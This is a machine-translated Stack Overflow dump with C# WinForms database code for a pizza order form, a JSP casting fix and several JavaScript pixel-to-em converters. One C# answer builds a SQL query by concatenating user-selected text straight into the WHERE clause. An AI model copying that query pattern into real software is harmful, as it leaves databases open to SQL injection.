            for (int i = 0; i < dt.Rows.Count; i++)
            {
             cboPizzaType.Items.Add(dt.Rows[i]["PizzaType"]);
            }

            //fill toppings listbox
            SqlDataAdapter da2 = new SqlDataAdapter("select * from Topping",con);
            DataTable dt2 = new DataTable();
            da2.Fill(dt2);

            for (int i = 0; i < dt2.Rows.Count; i++)
            {
                lstToppings.Items.Add(dt2.Rows[i]["ToppingName"]);
            }

            con.Close();

        }

        private void cboPizzaType_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void lstToppings_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void bnPizOrd_Click(object sender, EventArgs e)
        {
            newPizzaName = cboPizzaType.Text.ToString();

            //Brings the user back to the main form
            this.DialogResult = DialogResult.OK;
        }

        private void bnAddTop_Click(object sender, EventArgs e)
        {

            object obj = lstToppings.SelectedItem;
            lstSelTop.Items.Add(obj);
            lstToppings.Items.Remove(obj); 

        }

        private void bnDelTop_Click(object sender, EventArgs e)
        {
            object obj = lstSelTop.SelectedItem;
            lstToppings.Items.Add(obj);
            lstSelTop.Items.Remove(obj);

        }
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-24T21:45:56.777

有很多方法可以做到这一点这里有四种

1.  既然你有一个 DataTable 已经把它变成一个私有字段。然后在 ComboBox.SelectedIndex 更改上，您可以检索所选值，然后使用[`DataTable.Select`or`DataTable.Find`](http://msdn.microsoft.com/en-us/library/y06xa2h1%28v=VS.80%29.aspx)或[Linq To DataSet](http://msdn.microsoft.com/en-us/library/bb386977.aspx)检索价格值。

2.  您可以只设置组合框的[`DataSource`](http://msdn.microsoft.com/en-us/library/system.windows.forms.listcontrol.datasource.aspx)、[`DisplayMember`](http://msdn.microsoft.com/en-us/library/system.windows.forms.listcontrol.displaymember.aspx)和[`ValueMember`](http://msdn.microsoft.com/en-us/library/system.windows.forms.listcontrol.valuemember.aspx)属性。DataSource 是数据表，显示成员是名称，值成员是价格。任何时候只要你想要价格就可以使用[`ComboBox.SelectedValue`](http://msdn.microsoft.com/en-us/library/system.windows.forms.listcontrol.selectedvalue.aspx)（在这种情况下不需要保留一个私有字段，因为数据源会保留它）

3.  您也可以使用上述两者的组合。例如，您可以为值成员使用 ID，您可以使用 #1 中描述的技术进行查找。

4.  仍然设置数据源，使用任何你想要的值成员，并使用[`DataManager`](http://msdn.microsoft.com/en-us/library/system.windows.forms.listcontrol.datamanager.aspx)组合框的，并在需要时访问所选项目的整行

顺便说一句，许多人不喜欢使用 DataTables，而是更喜欢使用自定义类的集合。以上所有内容都适用于普通集合，除了您将仅使用 Linq 或 IEnumerable 方法而不是 linq to dataset 或 datatable 方法

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T21:41:49.713

你想这样做吗？

```
private void cboPizzaType_SelectedIndexChanged(object sender, EventArgs e)         
{           
SqlConnection con = new SqlConnection(ItalianoLIB.DLL.DButils.CONSTR);             
con.Open();              
SqlDataAdapter da = new SqlDataAdapter("select PizzaPrice from pizza WHERE PizzaType='" + cboPizzaType.Text + "'", con);             
DataTable dt = new DataTable();             
da.Fill(dt);  
con.Close();           
var oPrice = dt.Rows[0][0];
this.pizzaPrice = (double)oPrice;
} 
```

# java - 方法 UserBean 对 JSP 文件是 undefiend

> ID：10305987
> 
> 赞同：3
> 
> 时间：2012-04-24T21:05:22.770
> 
> 标签：java, jsp, servlets, javabeans

我得到的错误是：

```
The method UserBean(Object) is undefined for the type UserLogged_jsp 
```

它指向的代码是：

```
<% UserBean currentUser = (UserBean (session.getAttribute("currentSessionUser")));%> 
Welcome <%= currentUser.getFirstName() + " " + currentUser.getLastName() %> 
```

我已经包含了 UserBean java 文件：

```
<%@import ="org.login.UserBean" %> 
```

我只是不明白问题出在哪里。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-06-03T11:07:46.870

尝试这个：

```
<% UserBean currentUser = ((UserBean) (session.getAttribute("currentSessionUser")));%> 
   Welcome <%= currentUser.getFirstName() + " " + currentUser.getLastName() %> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-01-25T12:25:49.197

尝试这个：

```
<% UserBean currentUser = ((UserBean) (session.getAttribute("currentSessionUser")));%> 
   Welcome <%= currentUser.getFirstName() + " " + currentUser.getLastName() %> 
```

还要检查：

```
<%@ page language="java" 
         contentType="text/html; charset=windows-1256"
         pageEncoding="windows-1256"
         import="your.package.name.UserBean"
%> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-03-20T07:10:31.143

您应该更改您的导入语句。<%@ 页面导入 ="org.login.UserBean" %>。这个对我有用。

# javascript - jQuery/JavaScript：以简单的方式将像素转换为 em

> ID：10305993
> 
> 赞同：23
> 
> 时间：2012-04-24T21:05:45.163
> 
> 标签：javascript, jquery, pixel, em

我正在寻找一种简单的方法来向我的插件添加一行代码，将几个像素值转换为 em 值，因为我的项目的布局需要在 ems 中。有没有一种简单的方法可以做到这一点，因为我不想在网站上添加第三方插件。

不会在这里发布代码，因为它与它自己的插件无关。

谢谢。

示例：13px -> ??em

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-11-05T11:12:09.903

我认为你的问题非常重要。由于显示分辨率的类别正在迅速增加，因此使用 em 定位来支持广泛的屏幕分辨率是一种非常吸引人的方法。但是，无论您多么努力地将所有内容都保留在 em 中——有时您可能会从 JQuery 拖放或其他库中获得一个像素值，并且您希望在将其发送回服务器以保持持久性之前将此值转换为 em。这样，下次用户查看页面时，项目将处于正确位置——无论他们使用的设备的屏幕分辨率如何。

当您可以查看代码时，JQuery 插件并不是很可怕，特别是如果它们像[这个插件一样简短而甜美，可以根据需要将像素值转换为 em](https://raw.github.com/arasbm/jQuery-Pixel-Em-Converter/master/pxem.jQuery.js)。事实上它太短了，我会把整个东西贴在这里。有关版权声明，请参阅链接。

```
$.fn.toEm = function(settings){
    settings = jQuery.extend({
        scope: 'body'
    }, settings);
    var that = parseInt(this[0],10),
        scopeTest = jQuery('<div style="display: none; font-size: 1em; margin: 0; padding:0; height: auto; line-height: 1; border:0;">&nbsp;</div>').appendTo(settings.scope),
        scopeVal = scopeTest.height();
    scopeTest.remove();
    return (that / scopeVal).toFixed(8) + 'em';
};

$.fn.toPx = function(settings){
    settings = jQuery.extend({
        scope: 'body'
    }, settings);
    var that = parseFloat(this[0]),
        scopeTest = jQuery('<div style="display: none; font-size: 1em; margin: 0; padding:0; height: auto; line-height: 1; border:0;">&nbsp;</div>').appendTo(settings.scope),
        scopeVal = scopeTest.height();
    scopeTest.remove();
    return Math.round(that * scopeVal) + 'px';
}; 
```

用法示例：`$(myPixelValue).toEm();`或`$(myEmValue).toPx();`。

我刚刚在我的应用程序中对此进行了测试，效果很好。所以我想我分享。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-04-24T21:19:15.247

以下似乎按照您的要求执行，尽管它基于`font-size`父元素和元素本身的返回`px`：

```
function px2em(elem) {
    var W = window,
        D = document;
    if (!elem || elem.parentNode.tagName.toLowerCase() == 'body') {
        return false;
    }
    else {
        var parentFontSize = parseInt(W.getComputedStyle(elem.parentNode, null).fontSize, 10),
            elemFontSize = parseInt(W.getComputedStyle(elem, null).fontSize, 10);

        var pxInEms = Math.floor((elemFontSize / parentFontSize) * 100) / 100;
        elem.style.fontSize = pxInEms + 'em';
    }
} 
```

[JS Fiddle 概念证明](http://jsfiddle.net/davidThomas/nEnNC/2)。

笔记：

*   如果您尝试转换为的元素是 ，则该函数返回 false ，`em`尽管`body`那是因为我无法确定将值设置为`1em`还是不理会它是否明智。

*   它使用`window.getComputedStyle()`，因此如果不进行一些调整，它将无法与 IE 一起使用。

参考：

*   [`Math.floor()`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Math/floor).
*   [`parentNode`](https://developer.mozilla.org/en/DOM/Node.parentNode).
*   [`parseInt()`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/parseInt).
*   [`tagName`](https://developer.mozilla.org/en/DOM/element.tagName).
*   [`toLowerCase()`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/toLowerCase).
*   [`window.getComputedStyle()`](https://developer.mozilla.org/en/DOM/window.getComputedStyle).

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-24T21:11:33.320

像素和ems是根本不同类型的单位。您不能简单地在它们之间进行转换。

例如，用户在一个网站上的默认字体大小为 16 像素，其中顶级标题的样式为 200% 字体大小，1em 可能等于 32 像素。将标题移到文档中的其他位置，可以是 64 像素或 16 像素。将相同的文档提供给不同的用户，它可能是 30/60/15px。开始谈论不同的元素，它可以再次改变。

最接近您想要的是将像素转换为 ems+document+context+settings。但是，如果有人要求您使用 em 布置您的项目，他们可能不会因为您尝试以像素为单位然后“转换”而感到高兴。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-10-31T11:40:39.323

老问题，但作为参考，这是我拼凑的东西，范围和后缀是可选的。将 rem 或 em 值作为字符串传递给它，例如。'4em' [您可以使用空格和大写/小写]，它将返回 px 值。除非您给它一个范围，这将是查找本地 EM 值的目标元素，否则它将默认为 body，有效地为您提供 rem 值。最后，可选的后缀参数 [ boolean ] 会将 'px' 添加到返回值，例如 48 变为 48px。

前任：`emRemToPx( '3em', '#content' )`

在字体大小为 16px / 100% 的文档上返回 48

```
/**
* emRemToPx.js | @whatsnewsisyphus 
* To the extent possible under law, the author(s) have dedicated all copyright and related and neighboring rights to this software to the public domain worldwide. This software is distributed without any warranty.
* see CC0 Public Domain Dedication <http://creativecommons.org/publicdomain/zero/1.0/>.
*/
  var emRemToPx = function( value, scope, suffix ) {
    if (!scope || value.toLowerCase().indexOf("rem") >= 0) {
      scope = 'body';
    }
    if (suffix === true) {
      suffix = 'px';
    } else {
      suffix = null;
    }
    var multiplier = parseFloat(value);
    var scopeTest = $('<div style="display: none; font-size: 1em; margin: 0; padding:0; height: auto; line-height: 1; border:0;">&nbsp;</div>').appendTo(scope);
    var scopeVal = scopeTest.height();
    scopeTest.remove();
    return Math.round(multiplier * scopeVal) + suffix;
  }; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-10-14T05:41:57.607

我已经将此功能打包到一个库中，并完成了参数类型检查：[`px-to-em`](https://github.com/jacksonrayhamilton/px-to-em)

鉴于此 HTML：

```
<p id="message" style="font-size: 16px;">Hello World!</p> 
```

您可以期待这些输出：

```
pxToEm(16, message) === 1
pxToEm(24, message) === 1.5
pxToEm(32, message) === 2 
```

由于 OP 要求在没有库的情况下执行此操作，因此我将源代码复制`px-to-em`到了现场演示中：

```
function pxToEm (px, element) {
  element = element === null || element === undefined ? document.documentElement : element;
  var temporaryElement = document.createElement('div');
  temporaryElement.style.setProperty('position', 'absolute', 'important');
  temporaryElement.style.setProperty('visibility', 'hidden', 'important');
  temporaryElement.style.setProperty('font-size', '1em', 'important');
  element.appendChild(temporaryElement);
  var baseFontSize = parseFloat(getComputedStyle(temporaryElement).fontSize);
  temporaryElement.parentNode.removeChild(temporaryElement);
  return px / baseFontSize;
}

console.log(pxToEm(16, message), 'Should be 1');
console.log(pxToEm(24, message), 'Should be 1.5');
console.log(pxToEm(32, message), 'Should be 2');
```

```
<p id="message" style="font-size: 16px;">Hello World!</p>
```

我从[这个答案](https://stackoverflow.com/a/46739278/1468130)中了解到，`getComputedStyle`我们可以可靠地获得带有小数点的除数 px 值，从而提高了计算的准确性。我发现 Aras 的答案可能会偏离 0.5px 以上，这给我们带来了舍入误差。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-12-31T02:02:47.480

通常，当您想转换`px`为`em`时，转换发生在元素本身上。`getComputedStyle`返回`px`破坏其响应能力的值。下面的代码可用于帮助解决此问题：

```
/**
 * Get the equivalent EM value on a given element with a given pixel value.
 *
 * Normally the number of pixel specified should come from the element itself (e.g. element.style.height) since EM is
 * relative.
 *
 * @param {Object} element - The HTML element.
 * @param {Number} pixelValue - The number of pixel to convert in EM on this specific element.
 *
 * @returns {Boolean|Number} The EM value, or false if unable to convert.
 */
window.getEmValueFromElement = function (element, pixelValue) {
    if (element.parentNode) {
        var parentFontSize = parseFloat(window.getComputedStyle(element.parentNode).fontSize);
        var elementFontSize = parseFloat(window.getComputedStyle(element).fontSize);
        var pixelValueOfOneEm = (elementFontSize / parentFontSize) * elementFontSize;
        return (pixelValue / pixelValueOfOneEm);
    }
    return false;
}; 
```

使用它很简单：

```
var element = document.getElementById('someDiv');
var computedHeightInEm = window.getEmValueFromElement(element, element.offsetHeight); 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2019-02-21T10:52:01.110

尝试使用这个：

```
parseInt(myPixelValue) / parseFloat($("body").css("font-size")); 
```

* * *

## 回答 #8

> 赞同：-3
> 
> 时间：2012-04-24T21:11:43.553

无论如何，ems不等于像素。它们是相对测量值。

```
<span style="font-size: 1em;">This is 1em font size, which means the text is the same size as the parent</span>

<span style="font-size: 1.5em;">This is 1.5em font size, which means the text is 150% the size as the parent</span> 
```

基本大小由用户代理（浏览器）确定。